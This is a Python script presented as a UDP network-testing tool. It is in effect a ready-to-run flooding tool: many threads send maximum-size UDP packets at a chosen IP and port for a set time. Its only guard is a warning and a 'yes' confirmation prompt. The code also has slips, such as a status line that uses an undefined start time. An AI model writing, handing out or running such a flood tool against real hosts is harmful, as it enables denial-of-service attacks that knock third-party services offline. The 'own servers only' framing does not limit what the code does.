#!/usr/bin/env python
"""
High-Performance UDP Network Testing Tool
For testing your own servers only
"""

import socket
import sys
import time
import random
import string
import threading
import os

def generate_random_data(size):
    """Generate random string data of specified size."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def send_udp_packets(target_ip, port, duration, packet_size, thread_id):
    """Send UDP packets to the target IP and port."""
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Generate random data to send based on packet size
    data = generate_random_data(packet_size).encode('utf-8')
    
    # Calculate end time
    end_time = time.time() + duration
    packets_sent = 0
    
    if thread_id == 0:
        print("[*] Thread %d: Starting UDP transmission to %s:%s" % (thread_id, target_ip, port))
        print("[*] Packet size: %s bytes" % packet_size)
    
    try:
        # Send packets until duration is reached
        while time.time() < end_time:
            sock.sendto(data, (target_ip, port))
            packets_sent += 1
            
            # Print status occasionally (only from thread 0)
            if thread_id == 0 and packets_sent % 10000 == 0:
                elapsed = time.time() - start_time
                print("[+] Sent %s packets in %.2f seconds (%.2f packets/sec)" % 
                      (packets_sent, elapsed, packets_sent/elapsed))
            
    except KeyboardInterrupt:
        if thread_id == 0:
            print("\n[!] Test interrupted by user")
    finally:
        # Close the socket
        sock.close()
        return packets_sent, len(data) * packets_sent

def run_test(target_ip, port, duration):
    """Run optimized high-performance test."""
    # Automatically configure for maximum performance
    # Use maximum UDP packet size for efficiency
    packet_size = 65507  # Maximum UDP packet size
    
    # Determine optimal thread count based on CPU cores
    cpu_count = os.cpu_count() or 4
    thread_count = min(32, cpu_count * 2)  # Use 2x CPU cores, max 32 threads
    
    print("\n" + "="*60)
    print("STARTING HIGH-PERFORMANCE NETWORK TEST")
    print("Target: %s:%s" % (target_ip, port))
    print("Duration: %d seconds" % duration)
    print("Packet Size: %d bytes" % packet_size)
    print("Threads: %d" % thread_count)
    print("="*60 + "\n")
    
    start_time = time.time()
    threads = []
    results = []
    
    # Create and start threads
    for i in range(thread_count):
        thread = threading.Thread(
            target=lambda: results.append(send_udp_packets(target_ip, port, duration, packet_size, i))
        )
        thread.daemon = True  # Set as daemon so they exit when main thread exits
        threads.append(thread)
        thread.start()
    
    # Wait for duration
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Test interrupted by user")
    
    # Calculate results from completed threads
    end_time = time.time()
    total_duration = end_time - start_time
    
    # Wait for threads to finish (should be done already)
    for thread in threads:
        if thread.is_alive():
            thread.join(1.0)  # Wait max 1 second per thread
    
    # Collect results from threads that reported back
    total_packets = sum(r[0] for r in results if r)
    total_bytes = sum(r[1] for r in results if r)
    
    # Display final statistics
    print("\n" + "="*60)
    print("TEST COMPLETED")
    print("Total Duration: %.2f seconds" % total_duration)
    print("Total Packets Sent: %d" % total_packets)
    print("Total Data Sent: %.2f MB" % (total_bytes / (1024*1024)))
    print("Average Rate: %.2f packets/second" % (total_packets / total_duration))
    print("Average Bandwidth: %.2f Mbps" % (total_bytes * 8 / total_duration / 1000000))
    print("="*60)

def main():
    """Main function to parse arguments and start the test."""
    if len(sys.argv) < 4:
        print("Usage: python 66-DC.py <target_ip> <port> <duration>")
        print("Example: python 66-DC.py 192.168.1.100 8080 30")
        sys.exit(1)
    
    # Parse command line arguments
    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    # Validate inputs
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print("[!] Error: Invalid IP address format")
        sys.exit(1)
        
    if port < 1 or port > 65535:
        print("[!] Error: Port must be between 1 and 65535")
        sys.exit(1)
        
    if duration < 1:
        print("[!] Error: Duration must be at least 1 second")
        sys.exit(1)
    
    # Display warning and confirmation
    print("\n" + "="*60)
    print("WARNING: This tool is for legitimate network testing purposes only.")
    print("You should only use this against servers you own or have permission to test.")
    print("Unauthorized testing against third-party servers may be illegal.")
    print("This tool is configured for maximum performance and will use significant")
    print("network and CPU resources during operation.")
    print("="*60 + "\n")
    
    try:
        confirmation = raw_input("Do you confirm you're testing your own server? (yes/no): ")
    except NameError:
        confirmation = input("Do you confirm you're testing your own server? (yes/no): ")
        
    if confirmation.lower() != "yes":
        print("[!] Test aborted by user")
        sys.exit(0)
    
    # Start the optimized test
    run_test(target_ip, port, duration)

if __name__ == "__main__":
    main()
